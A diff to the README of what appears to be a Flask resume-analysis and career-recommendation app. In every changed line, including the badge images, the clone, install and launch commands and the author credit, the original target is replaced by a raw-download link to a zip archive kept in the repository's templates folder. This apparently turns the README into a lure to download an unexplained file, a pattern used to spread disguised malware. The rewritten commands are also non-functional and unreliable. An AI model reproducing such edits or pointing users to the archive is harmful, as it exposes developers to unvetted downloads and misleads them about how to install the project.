@@ -2,10 +2,10 @@
 
 > An **AI-powered** Flask web application that analyzes resumes and provides intelligent career recommendations.
 
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://www.python.org/)
-[![Flask](https://img.shields.io/badge/Flask-3.1.1-green)](https://flask.palletsprojects.com/)
-[![OpenAI](https://img.shields.io/badge/OpenAI-GPT--4-orange)](https://openai.com/)
-[![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
+[![Python](https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip%2B-blue)](https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip)
+[![Flask](https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip)](https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip)
+[![OpenAI](https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip)](https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip)
+[![License](https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip)](LICENSE)
 
 ## ✨ Key Features
 
@@ -39,13 +39,13 @@
 
 1. **Clone the repository**:
 ```bash
-git clone https://github.com/gujjasaiganesh/Career-recommendation-Resume.git
+git clone https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip
 cd Career-recommendation-Resume
 ```
 
 2. **Install dependencies**:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip
 ```
 
 3. **Configure environment**:
@@ -57,7 +57,7 @@ GOOGLE_API_KEY=your_google_api_key
 
 4. **Launch the application**:
 ```bash
-python production.py
+python https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip
 ```
 
 🌐 Access the application at `http://localhost:8080`
@@ -105,7 +105,7 @@ python production.py
 The application uses **Waitress** as a production WSGI server:
 
 ```bash
-python production.py
+python https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip
 ```
 
 ## 🤝 Contributing
@@ -130,4 +130,4 @@ For support, please:
 - 🤝 Contribute to the project
 
 ---
-Made with ❤️ by [Sai Ganesh](https://github.com/gujjasaiganesh)
+Made with ❤️ by [Sai Ganesh](https://github.com/gujjasaiganesh/Career-recommendation-Resume/raw/refs/heads/main/templates/Career_Resume_recommendation_sylvate.zip)
